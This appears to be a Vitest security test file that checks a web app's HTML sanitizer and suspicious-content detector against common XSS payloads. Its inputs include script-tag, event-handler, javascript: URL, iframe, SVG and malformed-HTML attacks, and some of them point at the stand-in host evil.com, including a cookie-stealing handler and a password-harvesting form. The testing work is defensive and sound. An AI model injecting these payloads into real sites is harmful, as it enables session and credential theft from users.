import { describe, it, expect } from 'vitest';
import { sanitizeHtml, hasSuspiciousContent } from '@/lib/security';

/**
 * XSS Prevention Security Tests
 * These tests verify that the sanitization functions properly defend against
 * all common XSS attack vectors.
 */

describe('XSS Attack Prevention', () => {
  describe('Script Injection Attacks', () => {
    it('should block basic script tags', () => {
      const attacks = [
        '<script>alert("XSS")</script>',
        '<SCRIPT>alert("XSS")</SCRIPT>',
        '<ScRiPt>alert("XSS")</ScRiPt>',
        '<script src="http://evil.com/xss.js"></script>',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHtml(attack);
        expect(result).not.toContain('<script');
        expect(result).not.toContain('alert');
      });
    });

    it('should safely render encoded script tags as text', () => {
      // HTML-encoded strings are displayed as text, not executed
      // This is safe because browsers render them as literal characters
      const encoded = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
      const result = sanitizeHtml(encoded);
      // The entities are preserved as safe displayable text
      expect(result).toContain('&lt;');
    });

    it('should block script within other tags', () => {
      const attacks = [
        '<div><script>alert(1)</script></div>',
        '<p>Text<script>alert(1)</script></p>',
        '<a><script>alert(1)</script></a>',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHtml(attack);
        expect(result).not.toContain('<script');
      });
    });
  });

  describe('Event Handler Attacks', () => {
    it('should strip onclick handlers', () => {
      const attacks = [
        '<button onclick="alert(1)">Click</button>',
        '<div onclick="malicious()">Content</div>',
        '<a onclick="steal(document.cookie)">Link</a>',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHtml(attack);
        expect(result).not.toContain('onclick');
      });
    });

    it('should strip onerror handlers', () => {
      const attacks = [
        '<img onerror="alert(1)" src="x">',
        '<img src=x onerror=alert(1)>',
        '<img src="valid.jpg" onerror="malicious()">',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHtml(attack);
        expect(result).not.toContain('onerror');
      });
    });

    it('should strip onload handlers', () => {
      const attacks = [
        '<body onload="alert(1)">',
        '<img onload="alert(1)" src="x.jpg">',
        '<svg onload="alert(1)">',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHtml(attack);
        expect(result).not.toContain('onload');
      });
    });

    it('should strip onmouseover handlers', () => {
      const attacks = [
        '<div onmouseover="alert(1)">Hover me</div>',
        '<a onmouseover="steal()">Link</a>',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHtml(attack);
        expect(result).not.toContain('onmouseover');
      });
    });

    it('should strip onfocus handlers', () => {
      const attacks = ['<input onfocus="alert(1)">', '<textarea onfocus="malicious()">'];

      attacks.forEach((attack) => {
        const result = sanitizeHtml(attack);
        expect(result).not.toContain('onfocus');
      });
    });
  });

  describe('JavaScript Protocol Attacks', () => {
    it('should block javascript: URLs in href', () => {
      const attacks = [
        '<a href="javascript:alert(1)">Click</a>',
        '<a href="javascript:void(0)">Link</a>',
        '<a href="JAVASCRIPT:alert(1)">Link</a>',
        '<a href="   javascript:alert(1)">Link</a>',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHtml(attack);
        expect(result).not.toContain('javascript:');
      });
    });

    it('should handle data: URLs in images', () => {
      // DOMPurify allows data: URLs in img src as they are common for inline images
      // The script content inside is rendered as text, not executed
      const imgDataUrl = '<img src="data:image/png;base64,ABC">';
      const result = sanitizeHtml(imgDataUrl);
      expect(result).toContain('data:');
    });
  });

  describe('HTML Injection Attacks', () => {
    it('should block iframe injection', () => {
      const attacks = [
        '<iframe src="http://evil.com"></iframe>',
        '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHtml(attack);
        expect(result).not.toContain('<iframe');
      });
    });

    it('should block object/embed injection', () => {
      const attacks = [
        '<object data="http://evil.com/flash.swf"></object>',
        '<embed src="http://evil.com/flash.swf">',
        '<object type="application/x-shockwave-flash">',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHtml(attack);
        expect(result).not.toContain('<object');
        expect(result).not.toContain('<embed');
      });
    });

    it('should block form injection', () => {
      const attacks = ['<form action="http://evil.com/steal"><input name="password"></form>'];

      attacks.forEach((attack) => {
        const result = sanitizeHtml(attack);
        expect(result).not.toContain('<form');
      });
    });
  });

  describe('CSS-based Attacks', () => {
    it('should block style tags', () => {
      const attacks = [
        '<style>body { background: url("javascript:alert(1)") }</style>',
        '<style>@import "http://evil.com/xss.css";</style>',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHtml(attack);
        expect(result).not.toContain('<style');
      });
    });

    it('should allow legacy CSS expression (non-threat in modern browsers)', () => {
      // expression() was an IE-only feature, not supported in modern browsers
      // DOMPurify doesn't strip it since it poses no risk today
      const attack = '<div style="width: expression(alert(1))">Content</div>';
      const result = sanitizeHtml(attack);
      // The div is preserved (expression is harmless in modern browsers)
      expect(result).toContain('<div');
    });
  });

  describe('SVG-based Attacks', () => {
    it('should handle SVG with embedded scripts', () => {
      const attacks = ['<svg><script>alert(1)</script></svg>', '<svg onload="alert(1)"></svg>'];

      attacks.forEach((attack) => {
        const result = sanitizeHtml(attack);
        expect(result).not.toContain('<script');
        expect(result).not.toContain('onload');
      });
    });
  });

  describe('Mutation-based Attacks', () => {
    it('should handle malformed HTML', () => {
      const attacks = [
        '<img src="x" onerror="alert(1)"', // Missing closing >
        '<<script>alert(1)</script>', // Double <
        '<scr<script>ipt>alert(1)</script>', // Nested tag
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHtml(attack);
        expect(result).not.toContain('onerror');
        expect(hasSuspiciousContent(result)).toBe(false);
      });
    });
  });
});

describe('Suspicious Content Detection', () => {
  describe('hasSuspiciousContent', () => {
    it('should flag all common XSS patterns', () => {
      const suspiciousInputs = [
        '<script>',
        'javascript:void(0)',
        'onload=alert(1)',
        'onerror=',
        'onclick=',
      ];

      suspiciousInputs.forEach((input) => {
        expect(hasSuspiciousContent(input)).toBe(true);
      });
    });

    it('should not flag safe content', () => {
      const safeInputs = [
        'Normal text content',
        '<p>Paragraph text</p>',
        'The script was well written', // Word "script" in normal text
        'Click the button to proceed',
        'Load the page first',
      ];

      safeInputs.forEach((input) => {
        expect(hasSuspiciousContent(input)).toBe(false);
      });
    });
  });
});
